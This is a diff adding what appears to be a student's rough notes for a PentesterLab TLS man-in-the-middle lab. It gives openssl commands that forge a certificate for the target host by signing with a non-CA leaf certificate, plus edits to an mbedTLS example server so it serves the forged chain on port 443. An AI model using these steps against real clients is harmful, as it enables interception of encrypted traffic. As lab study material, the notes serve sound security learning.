@@ -1,0 +1,136 @@
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+-> download tls.mbed.org
+-> get gandi certificate (key,crt,pem,cnf)
+-> three steps in this attack:
+
+1. generate malicious certificate (signed by a valid certificate, but not a certificate authority - client does not validate that ALL certificates are issued by certificate authority. such certificates should only be the leaf/last certificate)
+
+rootCA->hackingwithptlab->mitm4
+
+$ openssl x509 -in hackingwithpentesterlab.link.crt -text | less
+$ openssl genrsa -out mitm4.pentesterlab.com.key 2048
+$ openssl req -new -sha256 -key mitm4.pentesterlab.com.key -out mitm4.pentesterlab.com.csr
+
+>> Common Name (e.g. server FQDN or YOUR name) []:mitm4.pentesterlab.com
+
+mkdir -p demoCA/private demoCA/newcerts
+cp hackingwithpentesterlab.link.key demoCA/private/cakey.pem
+cp hackingwithpentesterlab.link.crt demoCA/cacert.pem
+touch demoCA/index.txt
+echo 01 > demoCA/serial
+
+openssl ca   -config openssl.cnf -verbose  -out mitm4.pentesterlab.com.crt -infiles mitm4.pentesterlab.com.csr
+
+>> y
+>> y
+
+
+
+
+2. create the malicious server
+
+
+wget https://tls.mbed.org/download/mbedtls-2.2.1-apache.tgz
+tar -zxf mbedtls-2.2.1-apache.tgz
+cd mbedtls-2.2.1
+apt-get update && apt-get upgrade #hygiene
+apt-get install build-essential
+make
+
+
+# look at examples / unit tests to understand big libraries
+
+
+cat mitm4.pentesterlab.com.crt hackingwithpentesterlab.link.crt GandiStandard
+SSLCA2.pem > myca.pem
+
+***
+vim programs/ssl/ssl_server.c (make changes according to below instructions)
+make (only ssl_server.c has changed)
+sudo ./programs/ssl/ssl_server (sudo is important! i spent a lot of time to realize this)
+***
+
+___
+
+THE SERVER WORKS.
+WE CAN ACCESS THE WEBSITE ON PORT 443 USING A WEB BROWSER.
+BUT THE SCORING MECHANISM IS NOT WORKING.
+EVEN DNSMASQ ISN'T SHOWING UP ANY RESULTS.
+has it got something to do with udp ?? 
+___
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+openssl x509 -in hackingwithpentesterlab.link.crt -text | less
+openssl genrsa -out mitm4.pentesterlab.com.key 2048
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+$ openssl req -new -sha256 -key mitm4.pentesterlab.com.key -out mitm4.pentesterlab.com.csr
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:mitm4.pentesterlab.com
+Email Address []:
+
+Please enter the following 'extra' attributes
+to be sent with your certificate request
+A challenge password []:
+An optional company name []:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+mkdir -p demoCA/private demoCA/newcerts
+cp hackingwithpentesterlab.link.key demoCA/private/cakey.pem
+cp hackingwithpentesterlab.link.crt demoCA/cacert.pem
+touch demoCA/index.txt
+echo 01 > demoCA/serial
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+openssl ca   -config openssl.cnf -verbose  -out mitm4.pentesterlab.com.crt -infiles mitm4.pentesterlab.com.csr
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+(i) https://github.com/hubert3/iSniff
+(ii) implementation for invalid chains
+
+we're going with (ii)
+
+
+wget https://tls.mbed.org/download/mbedtls-2.2.1-apache.tgz
+tar -zxf mbedtls-2.2.1-apache.tgz
+cd mbedtls-2.2.1
+apt-get update && apt-get upgrade #hygiene
+sudo apt-get install build-essential
+make
+
+sudo vim programs/ssl/ssl_server.c
+134G: ret =  mbedtls_x509_crt_parse_file(&srvcert, "/home/abhay_nayar/myca.pem");
+150G: ret =  mbedtls_pk_parse_keyfile(&pkey, "/home/abhay_nayar/mitm4.pentesterlab.com.key",NULL);
+find and change all 4433 to 443
+
+cat GandiStandardSSLCA2.pem hackingwithpentesterlab.link.crt mitm4.pentesterlab.com.crt > myca.pem
+./programs/ssl/ssl_server
+
+
+sudo service --status-all
+
+
+
+
+
+
+
